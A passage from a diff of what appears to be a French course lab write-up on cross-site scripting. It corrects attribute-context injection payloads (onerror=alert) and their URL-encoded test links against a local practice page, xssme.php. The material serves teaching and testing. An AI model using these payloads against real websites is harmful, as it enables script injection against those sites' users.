@@ -67,20 +67,20 @@ attributecontext1=%27%27%20onerror=alert(%22xss%22)
 Paramètre : attributecontext2
 
 ```bash
-attributecontext2="" onerror=alert('xss')
-attributecontext2=%22%22%20onerror=alert(%22xss%22)
+attributecontext2=" onerror=alert('xss')
+attributecontext2=%22%20onerror=alert(%22xss%22)
 ```
 
-<http://localhost:8080/tp2/ressources/xssme.php?attributecontext2=%22%22%20onerror=alert(%22xss%22)>
+<http://localhost:8080/tp2/ressources/xssme.php?attributecontext2=%22%20onerror=alert(%22xss%22)>
 
 Paramètre : attributecontext3
 
 ```bash
-attributecontext3='' onerror=alert('xss')
-attributecontext3=%27%27%20onerror=alert(%27xss%27)
+attributecontext3=' onerror=alert('xss')
+attributecontext3=%27%20onerror=alert(%27xss%27)
 ```
 
-<http://localhost:8080/tp2/ressources/xssme.php?attributecontext3=%27%27%20onerror=alert(%27xss%27)>
+<http://localhost:8080/tp2/ressources/xssme.php?attributecontext3=%27%20onerror=alert(%27xss%27)>
 
 Paramètre : scriptcontext
 
